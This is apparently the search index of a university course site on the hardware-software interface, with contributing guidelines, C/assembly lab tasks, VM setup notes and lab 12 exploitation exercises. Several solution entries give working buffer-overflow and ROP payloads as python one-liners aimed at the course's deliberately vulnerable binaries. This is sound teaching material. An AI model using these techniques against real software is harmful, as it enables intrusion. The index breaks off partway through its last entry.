{"0": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "Contributing to Hardware Software Interface OER",
    "content": "These are recommendations when contributing to the contents of the Hardware Software Interface OER repository. They consider contributions to both actual content (mostly Markdown) and support code made via Git. ",
    "url": "/CONTRIBUTING.html",
    
    "relUrl": "/CONTRIBUTING.html"
  },"1": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "First Steps",
    "content": "Some good first steps and best practices when using Git are explained here: . | the Git Immersion tutorial: https://gitimmersion.com/ | the Atlassian tutorial: https://www.atlassian.com/git/tutorials/learn-git-with-bitbucket-cloud | this blog post on the ROSEdu Techblog: https://techblog.rosedu.org/git-good-practices.html | . ",
    "url": "/CONTRIBUTING.html#first-steps",
    
    "relUrl": "/CONTRIBUTING.html#first-steps"
  },"2": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "Language",
    "content": "All of our content is developed in English. This means we use English for content, support code, commit messages, pull requests, issues, comments, everything. ",
    "url": "/CONTRIBUTING.html#language",
    
    "relUrl": "/CONTRIBUTING.html#language"
  },"3": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "Content Writing Style",
    "content": "This section addresses the development of session content and other Markdown files. Write each sentence on a new line. This way, changing one sentence only affects one line in the source code. Use the first person plural when writing documentation and tutorials. Use phrases like “we run the command / app”, “we look at the source code”, “we find the flag”. Use the second person for challenges and other individual activities. Use phrases like “find the flag”, “run this command”, “download the tool”. ",
    "url": "/CONTRIBUTING.html#content-writing-style",
    
    "relUrl": "/CONTRIBUTING.html#content-writing-style"
  },"4": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "Images",
    "content": "Use draw.io to create diagrams. If using external images / diagram, make sure they use a CC BY-SA license and give credits (mention author and / or add link to the image source). ",
    "url": "/CONTRIBUTING.html#images",
    
    "relUrl": "/CONTRIBUTING.html#images"
  },"5": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "Slides",
    "content": "Slides are to be written in Markdown, using reveal-md, itself based on reveal-js. Use reveal-md and reveal-js specifics to split information in slides. Aim to make slides attractive, sleek and simple to follow. Images and diagrams would ideally be animated on slides. Aim to use reveal.js features to animate drawing of diagrams. If reveal.js drawig is difficult, use draw.io to create diagrams. Ideally you would “animate” those diagrams by creating multiple incremental versions of the diagram and adding each to a slide; when browsing slides pieces of these diagrams will “appear” and complete the final image, rendering an animation-like effect. ",
    "url": "/CONTRIBUTING.html#slides",
    
    "relUrl": "/CONTRIBUTING.html#slides"
  },"6": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "Issues",
    "content": "When opening an issue, please clearly state the problem. Make sure it’s reproducible. Add images if required. Also, if relevant, detail the environment you used (OS, software versions). Ideally, if the issue is something you could fix, open a pull request with the fix. ",
    "url": "/CONTRIBUTING.html#issues",
    
    "relUrl": "/CONTRIBUTING.html#issues"
  },"7": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "Discussions",
    "content": "Use GitHub discussions for bringing up ideas on content, new chapters, new sections. Provide support to others asking questions and take part in suggestions brought by others. Please be civil when taking part in discussions. ",
    "url": "/CONTRIBUTING.html#discussions",
    
    "relUrl": "/CONTRIBUTING.html#discussions"
  },"8": {
    "doc": "Contributing to Hardware Software Interface OER",
    "title": "Pull Requests",
    "content": "For pull requests, please follow the GitHub flow: create a fork of the repository, create your own branch, do commits, push changes to your branch, do a pull request (PR). The destination branch of pull requests is the default master branch. Make sure each commit corresponds to one code / content change only. If there are multiple commits belonging to a given change, please squash the commits. Also make sure one pull request covers only one topic. Commits . Before making a commit, configure your name and email locally using: . git config --global user.name \"Your Name\" git config --global user.email \"your.email@example.com\" . Then make sure the email you’ve just configured corresponds to the one you have set on GitHub. After this, make your changes, git add them and then commit them using git commit -s. Always sign your commits using the -s / --signoff arguments to git commit. This will add the following line at the end of the commit message: . Signed-off-by: Your Name &lt;your.email@example.com&gt; . Notice that the details above are the name and email that you configured earlier. Now the git commit command will open your default editor and ask you to write a commit message. Prefix each commit message name with the chapter and content type it belongs to, e.g. TODO-chapter/reading, TODO-chapter/slides, TODO-chapter/drills. Following the prefix, write a short and expressive title on the first line. Use commit messages with verbs at imperative mood: “Add README”, “Update contents”, “Introduce feature”. Leave an empty line, then add a relevant description of the changes made in that commit. This description should include why that change is needed (fixes a bug, improves something that was inefficient, etc.). Wrap the lines of this description to 75 characters. How a good commit message should look like: https://cbea.ms/git-commit/ Below is an example of a good commit message: . template-chapter/drills: Fix Makefile `CFLAGS` error `CFLAGS` was incorrectly set to optimise the code to the `-O3` level. This caused the function `vulnerable_func()` to be inlined into the caller `main()`, making it impossible to overwrite `main()`'s return address with that of `vulnerable_func()`. This commit fixes the issue by forcing the compiler to not optimise the code by replacing `-O3` with `-O0` in `CFLAGS` Signed-off-by: Your Name &lt;your.name@example.com&gt; . The use of -s / --signoff when creating a commit is optional, but strongly recommended. ",
    "url": "/CONTRIBUTING.html#pull-requests",
    
    "relUrl": "/CONTRIBUTING.html#pull-requests"
  },"9": {
    "doc": "Task: Maximum Computation in Assembly with 64-bit C Call",
    "title": "Task: Maximum Computation in Assembly with 64-bit C Call",
    "content": "Navigate to tasks/max-c-calls-x64/support and open main.c . In this subdirectory you should have implemented the maximum assembly language calculation on a 64-bit system. Start the program from exercises 4 and 5 in such a way that you run it using a 64-bit system. After finishing the exercise and testing it manually, run the checker script in the max-c-calls-x64/tests/ folder to validate the result: . make check . The format of your output should be \"max: &lt;max value&gt; on position: &lt;position&gt;\\n\" In case of a correct solution, you will get an output such as: . test_max_c_calls_x64 ........................ passed ... 100 Total: 100/100 . TIP: https://en.wikipedia.org/wiki/X86_calling_conventions. The first thing to note is that on the x64 architecture the registers are 8 bytes in size and have different names than the 32-bit ones (in addition to extending the traditional ones: eax register becomes rax, ebx register becomes rbx, etc., there are new ones: R10-R15: for more information see here). Also, on x64 architecture parameters are no longer sent to the stack, but put in registers. The first 3 parameters are put in: rdi, rsi and rdx registers. This is not a uniformly adopted convention. This convention is only valid on Linux, on Windows there are other registers which are used to pass the parameters of a function. The calling convention requires that, for functions with a variable number of arguments, rax register be set to the number of vector registers used to pass arguments. printf() is a variable argument count function, and unless you use registers other than those mentioned in the previous paragraph for passing arguments, you must set rax = 0 before calling. Read more here. ",
    "url": "/labs/lab-09/tasks/max-c-calls-x64/README.html",
    
    "relUrl": "/labs/lab-09/tasks/max-c-calls-x64/README.html"
  },"10": {
    "doc": "Task: Maximum Calculation in C with Call from Assembly - 64 Bits",
    "title": "Task: Maximum Calculation in C with Call from Assembly - 64 Bits",
    "content": "Enter the directory tasks/max-assembly-calls-x64/support and implement the maximum calculation in C with a call from Assembly language on a 64-bit system. Start from the program used in tasks/max-assembly-calls, ensuring it runs on a 64-bit system. Follow the instructions from the previous exercise and pay attention to the order of parameters. After finishing the exercise and testing it manually, run the checker script to validate the result: . make check . The format of your output should be \"max: &lt;max value&gt; on position: &lt;position&gt;\\n\" In case of a correct solution, you will get an output such as: . test_max_asm_calls_x86_64 ........................ passed ... 100 Total: 100/100 . ",
    "url": "/labs/lab-09/tasks/max-assembly-calls-x64/README.html",
    
    "relUrl": "/labs/lab-09/tasks/max-assembly-calls-x64/README.html"
  },"11": {
    "doc": "Task: Keeping Records",
    "title": "Task: Keeping Records",
    "content": "Navigate to tasks/regs-preserve/support and open main.asm . In this subdirectory of the lab’s task repository you will find the print_reverse_array() function implemented by a simple loop that makes repeated calls of the printf() function. Follow the code in the main.asm file, compile and run the program. What happened? The program runs indefinitely. This is because the printf() function does not preserve the value in the ecx register, used here as a counter. Uncomment the lines marked TODO1 and rerun the program. ",
    "url": "/labs/lab-09/tasks/regs-preserve/README.html",
    
    "relUrl": "/labs/lab-09/tasks/regs-preserve/README.html"
  },"12": {
    "doc": "Task: Keeping Records",
    "title": "Troubleshooting SEGFAULT",
    "content": "Decompose the lines marked TODO2 in the assembly file from the previous exercise. The code sequence makes a call to the double_array() function, implemented in C, just before displaying the vector using the function seen earlier. Compile and run the program. To debug the segfault you can use the objdump utility to trace the assembly language code corresponding to the double_array() function. Notice which of the registers used before and after the call are modified by this function. Add the instructions for preserving and restoring the required registers to the assembly file. After finishing the exercise and testing it manually, run the checker script in the regs-preserve/tests/ folder to validate the result: . make check . In case of a correct solution, you will get an output such as: . test_regs_preserve ........................ passed ... 100 Total: 100/100 . If you’re having difficulties solving this exercise, go through this relevant section reading material. ",
    "url": "/labs/lab-09/tasks/regs-preserve/README.html#troubleshooting-segfault",
    
    "relUrl": "/labs/lab-09/tasks/regs-preserve/README.html#troubleshooting-segfault"
  },"13": {
    "doc": "Task: Corrupt Stack Frame Debugging",
    "title": "Task: Corrupt Stack Frame Debugging",
    "content": "Navigate to tasks/stack-frame/support and open main.c . In current subdirectory of the lab’s task archive you can find a C program that implements the display of the string Hello world! by a call to the print_hello() function defined in the assembly for the first part of the message, followed by two calls to the printf() function directly from the C code. Compile and run the program. What do you notice? The printed message is not as expected because the assembly code is missing an instruction. Use GDB to inspect the address at the top of the stack before executing the ret statement in the print_hello() function. What does it point to? Track the values of the ebp and esp registers during the execution of this function. What should be at the top of the stack after execution of the leave statement? . Find the missing instruction and rerun the executable. TIP: In order to restore the stack to its state at the start of the current function, the leave statement relies on the function’s pointer frame having been set. After finishing the exercise and testing it manually, run the checker script in the stack-frame/tests/ folder to validate the result: . make check . In case of a correct solution, you will get an output such as: . test_stack_frame ........................ passed ... 100 Total: 100/100 . If you’re having difficulties solving this exercise, go through this relevant section reading material. ",
    "url": "/labs/lab-09/tasks/stack-frame/README.html",
    
    "relUrl": "/labs/lab-09/tasks/stack-frame/README.html"
  },"14": {
    "doc": "Task: Warning (No Error)",
    "title": "Task: Warning (No Error)",
    "content": "Navigate to tasks/include-fix/support. Run the make command. You will get a warning. Is it from compiling or linking? Resolve this warning by editing the support/hello.c file. Resolve the warning without using the #include directive. If you’re having difficulties solving this exercise, go through this relevant section reading material. ",
    "url": "/labs/lab-09/tasks/include-fix/README.html",
    
    "relUrl": "/labs/lab-09/tasks/include-fix/README.html"
  },"15": {
    "doc": "Task: Maximum Calculation in C with Call from Assembly",
    "title": "Task: Maximum Calculation in C with Call from Assembly",
    "content": "Navigate to tasks/max-assembly-calls/support/ and open main.asm . In this directory you can find an implementation of calculating the maximum of a number where the main() function is defined in assembly language from which the get_max() function defined in C is called. Trace the code in the two files and how the function arguments and return value are passed. Compile and run the program. IMPORTANT: Pay attention to understanding the code before proceeding to the next exercise. ",
    "url": "/labs/lab-09/tasks/max-assembly-calls/README.html",
    
    "relUrl": "/labs/lab-09/tasks/max-assembly-calls/README.html"
  },"16": {
    "doc": "Task: Maximum Calculation in C with Call from Assembly",
    "title": "Extending Maximum Computation in C with Call from Assembly",
    "content": "Extend the program from the previous exercise (in assembly language and C) so that the get_max() function now has the signature unsigned int get_max(unsigned int *arr, unsigned int len, unsigned int *pos). The third argument to the function is the address where the position in the vector on which the maximum is found will be held. The position in the vector on which the maximum is found will also be displayed on display. TIP: To hold the position, it is best to define a global variable in the assembly file (main.asm) in the .data section, of the form . pos: dd 0 . This variable you will pass (by address) to the get_max() call and by value to the printf() call for display. For display modify the print_format string and the printf() call in the assembly file (main.asm) to allow two values to be displayed: maximum and position. After finishing the exercise and testing it manually, run the checker script to validate the result: . make check . The format of your output should be \"max: &lt;max value&gt; on position: &lt;position&gt;\\n\" In case of a correct solution, you will get an output such as: . test_max_asm_calls ........................ passed ... 100 Total: 100/100 . If you’re having difficulties solving this exercise, go through this relevant section reading material. ",
    "url": "/labs/lab-09/tasks/max-assembly-calls/README.html#extending-maximum-computation-in-c-with-call-from-assembly",
    
    "relUrl": "/labs/lab-09/tasks/max-assembly-calls/README.html#extending-maximum-computation-in-c-with-call-from-assembly"
  },"17": {
    "doc": "Task: Repair Export Problems",
    "title": "Task: Repair Export Problems",
    "content": "Navigate to tasks/export-fix/support/. Each subdirectory (support/a-func/, suppoer/b-var/, support/c-var-2/) contains a problem related to exporting some symbols (functions or variables). In each subdirectory, run the make command, identify the problem and edit the files needed to fix the problem. After finishing the exercise and testing it manually, run the checker script in export-fix/tests/ to validate the result: . make check . In case of a correct solution, you will get an output such as: . test_a_func ........................ passed ... 33 test_b_var ........................ passed ... 33 test_c_var_2 ........................ passed ... 34 Total: 100/100 . If you’re having difficulties solving this exercise, go through this relevant section reading material. ",
    "url": "/labs/lab-09/tasks/export-fix/README.html",
    
    "relUrl": "/labs/lab-09/tasks/export-fix/README.html"
  },"18": {
    "doc": "Task: Maximum Calculation in Assembly with Call from C",
    "title": "Task: Maximum Calculation in Assembly with Call from C",
    "content": "Navigate to tasks/max-c-calls/support and open main.c . In this subdirectory you can find an implementation of calculating the maximum of a number where the main() function is defined in C from which the get_max() function defined in assembly language is called. Trace the code in the two files and how the function arguments and return value are passed. Compile and run the program. To compile it run the command: . make . Then run the resulting executable: ./main . IMPORTANT: Pay attention to understanding the code before proceeding to the next exercise. IMPORTANT: The return value of a function is placed in the eax register. ",
    "url": "/labs/lab-09/tasks/max-c-calls/README.html",
    
    "relUrl": "/labs/lab-09/tasks/max-c-calls/README.html"
  },"19": {
    "doc": "Task: Maximum Calculation in Assembly with Call from C",
    "title": "Maximum Computation Extension in Assembly with Call from C",
    "content": "Extend the program from the previous exercise (in assembly language and C) so that the get_max() function now has the signature unsigned int get_max(unsigned int *arr, unsigned int len, unsigned int *pos). The third argument to the function is the address where the position in the vector on which the maximum is found will be held. The position in the vector on which the maximum is found will also be displayed on display. TIP: To hold the position, it is best to define a local variable pos in the main() function in the C file (main.c) in the form . unsigned int pos; . and call the get_max() function in the form: . max = get_max(arr, 10, &amp;pos); . After finishing the exercise and testing it manually, run the checker script in the max-c-calls/tests/ folder to validate the result: . make check . The format of your output should be \"max: &lt;max value&gt; on position: &lt;position&gt;\\n\" In case of a correct solution, you will get an output such as: . test_max_c_calls ........................ passed ... 100 Total: 100/100 . If you’re having difficulties solving this exercise, go through this relevant section reading material. ",
    "url": "/labs/lab-09/tasks/max-c-calls/README.html#maximum-computation-extension-in-assembly-with-call-from-c",
    
    "relUrl": "/labs/lab-09/tasks/max-c-calls/README.html#maximum-computation-extension-in-assembly-with-call-from-c"
  },"20": {
    "doc": "Lab 9 - The C - Assembly Interaction",
    "title": "Lab 9 - The C - Assembly Interaction",
    "content": " ",
    "url": "/labs/lab-09/README.html",
    
    "relUrl": "/labs/lab-09/README.html"
  },"21": {
    "doc": "Lab 9 - The C - Assembly Interaction",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-09/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-09/README.html#getting-the-latest-changes"
  },"22": {
    "doc": "Lab 9 - The C - Assembly Interaction",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-08\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-09: . student@hsi:~/hardware-software-interface$ git checkout -b lab-09 main # Replace lab-09 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-09/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-09/README.html#save-progress-and-prepare-next-lab"
  },"23": {
    "doc": "Setup",
    "title": "Setup",
    "content": " ",
    "url": "/labs/setup/README.html",
    
    "relUrl": "/labs/setup/README.html"
  },"24": {
    "doc": "Setup",
    "title": "Virtual Machine",
    "content": "You can find the dedicated virtual machines for this course here. To access the page you will need to authenticate with your cs.curs.pub.ro credentials. There are 2 virtual machines available: . | Lubuntu 24.04 (recommended for most students) | Ubuntu Server 24.04 (recommended for Apple Silicon users, if the Lubuntu VM is too slow) | . To log in, use the user student with the password student. The student user has sudo privileges. Tools provided . Installed on the virtual machine are the following tools: . | gcc-multilib, gcc, nasm, make | objdump, nm | Ghidra, IDA | pwndbg | Text editors (vim, sublime, vscode) | TeamViewer, tmate | Python 2.7.18, Python 3.12.3 | Radare2 | . ",
    "url": "/labs/setup/README.html#virtual-machine",
    
    "relUrl": "/labs/setup/README.html#virtual-machine"
  },"25": {
    "doc": "Setup",
    "title": "Running the VM",
    "content": "Windows / Linux / Intel Macs . Get the OVA file (PCLP2.ova). It can be imported in VirtualBox, as well as VMware. Using VirtualBox, you may need to set the graphics controller to VMSVGA . Apple Silicon Macs . Since VirtualBox and VMware do not support emulating x86 on M series Macs, you will need to use the UTM app to run the VM. After downloading the UTM.dmg file, open it and drag the app to the Applications folder. UTM does not support importing OVA files, so you will need to download and use the virtual machine in the qcow2 format. | PCLP2.qcow2 for Lubuntu | ubuntu_server_pclp2.qcow2 for Ubuntu Server | . Since the virtual machine will be emulated, it will experience a significant performance drop compared to running natively on an x86 host. Thus, if you find the Lubuntu VM too slow, we recommend using the Ubuntu Server VM. Use the following tutorial to import the virtual machine in UTM: . | Click on Create a New Virtual Machine: . | Select Emulate: . | Select Other: . | Check None for the boot device: . | Allocate RAM to the VM (recommended 4GB): . | Set storage size (minimum 20GB): . | Skip shared directories setup: . | Name the VM: . | Right-click on the VM in the sidebar and select Edit: . | Go to QEMU and disable UEFI boot: . | Go to Drives and select New..., then click Import and select the qcow2 file: . | Right-click on the newly added drive and click Move up: . | Save the edits and start the VM . | . The Ubuntu Server VM has an SSH server opened on port 22. You can connect to it from your host machine using the terminal or the VSCode SSH extension. After starting the VM (it may take up to 2 minutes), you can find its IP address by running ip a s. ",
    "url": "/labs/setup/README.html#running-the-vm",
    
    "relUrl": "/labs/setup/README.html#running-the-vm"
  },"26": {
    "doc": "Setup",
    "title": "VSCode - GDB Integration",
    "content": "Configuration . Extensions to Install and their IDs . | Makefile tools (microsoft) ms-vscode.makefile-tools . | x86 and x86_64 Assembly (13xforever); language-x86-64-assembly . | GDB Debug (DamianKoper); gdb-debug . | From vscode menu: Terminal/Configure Default Build Task edit .vscode/tasks.json, and set the command to make all . \"command\": \"make\", \"args\": [ \"all\", \"\" ], \"options\": { \"cwd\": \"${fileDirname}\" }, \"group\": { \"kind\": \"build\", \"isDefault\": true } . | Press Ctrl-Shift-B to run the make all command. In the terminal, you can use Ctrl-Click on the filename with an error to navigate to it. | Either press F5 to start debugging, or directly edit .vscode/launch.json. It should contain: . \"stopAtEntry\": true, \"cwd\": \"/tmp/01-hello-world\", \"program\": \"/tmp/01-hello-world/hello\", \"miDebuggerPath\": \"gdb\", //\"args\": [\"&lt;\", \"1.in\"], // If during debugging we want stdin from a file 1.in . | When pressing F5, the debugger should start and stop at the first instruction. Use Ctrl-Shift-D to activate the debug window. | If you have C modules, a right-click inside those modules will show the option ‘Disassembly window’. | . Operation . | You can set breakpoints by right-clicking in the left column next to the line number. | In the debug window (Ctrl-Shift-D), it is recommended to activate Variables, Watch, and Call Stack. | Variables/Locals: Displays variables from C functions. | Variables/Registers/CPU: Displays 32-bit registers. | Watch/+: Add `print $eflags to see the updated flags (extra backtick required, see below). | In debug mode, right-click in the source code to open ‘Open disassembly view’. | In disassembly mode, you can set breakpoints in the left column next to the addresses. F10, F11, and Shift-F11 work here. | In the Terminal window, the program’s stdout and stdin are displayed. | In the Debug Console, the GDB prompt appears. All commands at the GDB prompt must be preceded by a backtick/backquote . Example: @ vscode prompt: `p/t $eax instead of plain p/t $eax inside standalone gdb. | . Hotkeys . | Ctrl-Shift-D Open debug window. | F5 Start debugging and continue. | F10 Step over - execute the entire function. | F11 Step into - enter functions. | Shift-F11 Step out - exit the current call. | . ",
    "url": "/labs/setup/README.html#vscode---gdb-integration",
    
    "relUrl": "/labs/setup/README.html#vscode---gdb-integration"
  },"27": {
    "doc": "Solution",
    "title": "Solution",
    "content": "Idea: The function that needs to be called is special_function() with arguments 6 and 9. The binary is a 64-bits ELF, therefore the parameters are no longer taken from the stack - they are taken from registers esi and edi in this order; in order to set these registers, you need to execute 2 gadgets. By using commands like rop --grep \"pop rsi\" and rop --grep \"pop rdi\" in pwndbg, you will find gadgets pop rsi; pop r15; ret and pop rdi; ret. We first need to overwrite the return address with the address of the first gadget, followed by 2 8-byte values (rsi and r15, which are not relevant); the value of rsi needs to be the value of the second argument; these values are followed by the address of the second gadget and the value of rdi - the first argument of the function. Finally, we jump to the address of special_function(), which you can find by using gdb and print special_function. The command below might need to be modified. python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*24 + b\"\\x6f\\x13\\x40\\x00\\x00\\x00\\x00\\x00\" + b\"\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + b\"\\x71\\x13\\x40\\x00\\x00\\x00\\x00\\x00\" + b\"\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + b\"\\xc6\\x12\\x40\\x00\\x00\\x00\\x00\\x00\")' | ./rop . Note: if you recompile the binary, if an address ends up having 0a as its least significant byte, you may have to increment it in order to prevent fgets() from reading it as a newline character - \\n. ",
    "url": "/labs/lab-12/tasks/rop/solution/README.html",
    
    "relUrl": "/labs/lab-12/tasks/rop/solution/README.html"
  },"28": {
    "doc": "Task: ROP",
    "title": "Task: ROP",
    "content": "rop/support/rop is a 64-bit binary with a simple buffer overflow. However, it has NX enabled, so normal shellcode will not work. Find a way to create a working exploit. TIP: On x86_64, function arguments are no longer found on the stack but in registers. If you’re having trouble with this exercise, you may use this. Keep in mind that peda’s functionality may be a bit different from that of the provided setup, but you should have this. In pwndbg, you can use something like rop --grep \"pop rsi\". ",
    "url": "/labs/lab-12/tasks/rop/README.html",
    
    "relUrl": "/labs/lab-12/tasks/rop/README.html"
  },"29": {
    "doc": "Task: ROP",
    "title": "Checker",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_payload ........................ passed ... 100 Total: 100/100 . ",
    "url": "/labs/lab-12/tasks/rop/README.html#checker",
    
    "relUrl": "/labs/lab-12/tasks/rop/README.html#checker"
  },"30": {
    "doc": "Solution",
    "title": "Solution",
    "content": "By using the buffer overflow in gateway(), functions f1(56, 13) and f3(13) need to be called in this order, with those exact parameters. f3 is the one that actually calls get_flag(). Calling get_flag() directly shouldn’t work (a global variable is checked to make sure all steps were made). python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*22 + b\"\\x56\\x93\\x04\\x08\" + b\"\\x00\\x93\\x04\\x08\" + b\"\\x38\\x00\\x00\\x00\" + b\"\\x0d\\x00\\x00\\x00\")' | ./buff-ovf3 . ",
    "url": "/labs/lab-12/tasks/feeling-chained/solution/README.html",
    
    "relUrl": "/labs/lab-12/tasks/feeling-chained/solution/README.html"
  },"31": {
    "doc": "Task: Feeling Chained",
    "title": "Task: Feeling Chained",
    "content": "Follow the sequence of operations in the functions of the binary at feeling-chained/support/buff-ovf3. Identify the necessary ones and… you already know how to call them. If you cannot find your way through this exercise, look for variables that you need to overwrite with specific values in order to finish the exploit, and think of their positioning on the stack. The previously mentioned online example is still highly relevant. ",
    "url": "/labs/lab-12/tasks/feeling-chained/README.html",
    
    "relUrl": "/labs/lab-12/tasks/feeling-chained/README.html"
  },"32": {
    "doc": "Task: Feeling Chained",
    "title": "Checker",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_payload ........................ passed ... 100 Total: 100/100 . ",
    "url": "/labs/lab-12/tasks/feeling-chained/README.html#checker",
    
    "relUrl": "/labs/lab-12/tasks/feeling-chained/README.html#checker"
  },"33": {
    "doc": "Solution",
    "title": "Solution",
    "content": "Run the executable with GDB, ideally with gef, pwndbg, or peda. As you step through, you will notice that the flag will appear in fragments in the display of the register contents (the flag string contains null characters placed specifically so that it would not be displayed all at once). $eax : 0x0804d625 → \"_out,\" $ebx : 0x0804d22e → \"_out,\" $ecx : 0x0804d62a → 0x00000000 $edx : 0x0804d625 → \"_out,\" . You may also see fragments in the memory dump, at times: . 0xffffd4b8│+0x0008: 0xf7fb9000 → 0x001ead6c 0xffffd4bc│+0x000c: 0x0804d600 → 0x00000000 0xffffd4c0│+0x0010: 0x0804d210 → 0x00495348 (\"HSI\"?) . ",
    "url": "/labs/lab-12/tasks/look-at-him-go/solution/README.html",
    
    "relUrl": "/labs/lab-12/tasks/look-at-him-go/solution/README.html"
  },"34": {
    "doc": "Task: Look at Him Go",
    "title": "Task: Look at Him Go",
    "content": "The look-at-him-go/support/dynamic binary is executable this time and its sole purpose is to obtain the flag and place it somewhere in memory. No tricks here. TIP: GDB is your friend. If you’re unable to progress in this exercise, reference the GDB lab and this. ",
    "url": "/labs/lab-12/tasks/look-at-him-go/README.html",
    
    "relUrl": "/labs/lab-12/tasks/look-at-him-go/README.html"
  },"35": {
    "doc": "Solution",
    "title": "Solution",
    "content": "Use the buffer overflow to overwrite a string on the stack. This is going to be copied to a global variable that is checked before calling the get_flag() function. python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*10 + b\"Bye\")' | ./buff-ovf . ",
    "url": "/labs/lab-12/tasks/indirect-business/solution/README.html",
    
    "relUrl": "/labs/lab-12/tasks/indirect-business/solution/README.html"
  },"36": {
    "doc": "Task: Indirect Business",
    "title": "Task: Indirect Business",
    "content": "The indirect-business/support/buff-ovf binary contains a classic vulnerability. Use the input to alter the data in your favor. If you experience a neural buffer overflow, take a look at the relevant lab and at online examples. If that still doesn’t work, keep in mind that the great cybersecurity expert named Sun Tzu was a big proponent of bruteforce attacks. ",
    "url": "/labs/lab-12/tasks/indirect-business/README.html",
    
    "relUrl": "/labs/lab-12/tasks/indirect-business/README.html"
  },"37": {
    "doc": "Task: Indirect Business",
    "title": "Checker",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_payload ........................ passed ... 100 Total: 100/100 . ",
    "url": "/labs/lab-12/tasks/indirect-business/README.html#checker",
    
    "relUrl": "/labs/lab-12/tasks/indirect-business/README.html#checker"
  },"38": {
    "doc": "Solution",
    "title": "Solution",
    "content": "The function address on the stack needs to be overwritten with the address of get_flag(). Before reaching that, the payload needs to pass through some local variables and the EBP. python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*41 + b\"\\xd6\\x91\\x04\\x08\")' | ./buff-ovf2 . ",
    "url": "/labs/lab-12/tasks/rip-my-buffers-off/solution/README.html",
    
    "relUrl": "/labs/lab-12/tasks/rip-my-buffers-off/solution/README.html"
  },"39": {
    "doc": "Task: RIP My Buffers Off",
    "title": "Task: RIP My Buffers Off",
    "content": "The rip-my-buffers-off/support/buff-ovf2 binary does not use the get_flag() function, but it offers an opportunity to call it. TIP: Where can a function address be overwritten? . This example, albeit also linked in the previous exercise, is still a great resource to help you solve this exercise. ",
    "url": "/labs/lab-12/tasks/rip-my-buffers-off/README.html",
    
    "relUrl": "/labs/lab-12/tasks/rip-my-buffers-off/README.html"
  },"40": {
    "doc": "Task: RIP My Buffers Off",
    "title": "Checker",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_payload ........................ passed ... 100 Total: 100/100 . ",
    "url": "/labs/lab-12/tasks/rip-my-buffers-off/README.html#checker",
    
    "relUrl": "/labs/lab-12/tasks/rip-my-buffers-off/README.html#checker"
  },"41": {
    "doc": "Solution",
    "title": "Solution",
    "content": "Run the executable with GDB. You can see the random number in the register before the input function call. $eax : 0x12986 $ebx : 0x0 $ecx : 0x12986 . ",
    "url": "/labs/lab-12/tasks/playing-god/solution/README.html",
    
    "relUrl": "/labs/lab-12/tasks/playing-god/solution/README.html"
  },"42": {
    "doc": "Task: Playing God",
    "title": "Task: Playing God",
    "content": "The playing-god/support/dynamic2 binary asks you to guess a number between 1 and 100000. Find a better way to discover it. To help you solve this exercise, like in the previous one, make sure to keep an eye on the registers! . ",
    "url": "/labs/lab-12/tasks/playing-god/README.html",
    
    "relUrl": "/labs/lab-12/tasks/playing-god/README.html"
  },"43": {
    "doc": "Solution",
    "title": "Solution",
    "content": "Looking at the disassembly of the link binary, it is noticeable that there is no main() function. This is a clear indicator that we have to find a way to call it ourselves. We define a get_flag() function prototype as void (you may be able to skip this step, but there will be an implicit declaration error during compilation) and we call it in our main function. We then compile and assemble the file: gcc -g -m32 -fno-PIC -c main.c . We then link it to the link binary: gcc -no-pie -m32 link main.o -o a.out . ",
    "url": "/labs/lab-12/tasks/hidden-in-plain-sight-1/solution/README.html",
    
    "relUrl": "/labs/lab-12/tasks/hidden-in-plain-sight-1/solution/README.html"
  },"44": {
    "doc": "Task: Hidden in Plain Sight",
    "title": "Task: Hidden in Plain Sight",
    "content": "The hidden-in-plain-sight-1/support/link binary provides everything you need. Find a way to use it. TIP: If you want a main function to be done right, you gotta do it yourself. If you are having trouble solving this exercise, check this. ",
    "url": "/labs/lab-12/tasks/hidden-in-plain-sight-1/README.html",
    
    "relUrl": "/labs/lab-12/tasks/hidden-in-plain-sight-1/README.html"
  },"45": {
    "doc": "Solution",
    "title": "Solution",
